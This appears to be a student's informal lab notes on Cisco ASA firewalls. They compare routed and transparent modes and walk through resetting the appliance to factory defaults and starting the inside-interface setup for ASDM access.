task2: ASA version, int, and license:

When the ASA is in routed mode the networks that are connected to
 the ASA on two interfaces need to be on different subnets.  
 While in transparent mode the subnets can be the same.

In routed mode, as the name indicates, packets are routed between 
the interfaces.  In transparent mode interfaces are bridged so 
the packet is forwarded instead of routed 
(though inspection and ACL checks still take place).

One situation could be that you need to implement a firewall in your 
network but your network design doesn't allow for changing the IP addressing
 scheme at this point in time.  Then you can place the ASA in transparent mode into the network
 and you will not need to change any IPs, just assign an IP within the 
 LAN subnet to the ASA.

Another situation might require you to implement a firewall that is not
 visible to programs that scan the network.  In this case you would
 implement the ASA in transparent mode and it will act like a "bump in the road".
 It will not be registered as a hop-count in the network, 
 but will still be filtering traffic.
 
TASK1: erase the ASA to factory:
b.	You can restore the ASA to its factory default settings by using the 
configure factory-default global configuration command:

ciscoasa(config)# configure factory-default

step2:Step 5: Clear the previous ASA configuration settings.

ciscoasa# write erase
ciscoasa# reload

Step 3: Bypass Setup mode and configure the ASDM interfaces:

Pre-configure Firewall now through interactive prompts [yes]? no

d.	Configure the inside interface G1/8 to prepare for ASDM access. 
The Security Level should be automatically set to the highest level of 100.
The interface G1/8 will be used by PC-B to access ASDM on ASA.
